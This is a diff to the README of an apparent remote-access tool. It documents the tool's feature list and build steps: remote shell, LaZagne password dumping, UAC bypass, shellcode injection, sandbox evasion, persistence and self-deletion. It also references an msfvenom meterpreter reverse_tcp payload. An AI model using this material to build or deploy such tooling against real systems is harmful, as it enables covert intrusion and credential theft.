@@ -35,19 +35,20 @@ Currently, this program has several features, notably:
 * Open remote shell or python interpreter
 * Find vulnerability(s) with [wesng](https://github.com/bitsadmin/wesng) and [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 * Dump various passwords with [LaZagne](https://github.com/AlessandroZ/LaZagne)
+* Ability to melt file
 * UAC Bypass with [WinPwnage](https://github.com/rootm0s/WinPwnage)*
 * Disable a process*
 * Inject shellcode*
 * VM/sandboxie check*
 * Add to startup*
-* Ability to melt file*
+
 
 > Asterisk means only supported on Windows 
 
 ## Quick Usage
 
 1. Open `src/setup.py -h` in python to view build args
-2. Run `src/setup.py` with desired args, eg. `-hI 192.168.10.92 -p 3003`
+2. Run `src/setup.py` with desired args, eg. `-o 192.168.10.92 -p 3003`
 3. Check the `dist` folder for the binary.
 4. Disable your firewall on the server or configure your firewall to allow the port chosen.
 5. Run the `src/main_server.py -p <port>` to start the server and accept connections.
@@ -66,7 +67,7 @@ eg.
 ## Common problems & Solutions
 
 - Injecting shellcode requires the architecture specified by the command. eg. x64: `msfvenom windows/x64/meterpreter/reverse_tcp`
-- For use outside of network specified port is not open, check specified port with a [port scanner](https://www.whatismyip.com/port-scanner/)
+- For use outside of network specified port is not open, check specified port with a [port scanner](https://dnschecker.org/port-scanner.php) **while the server is listening**
 
 ## Disclaimer
 
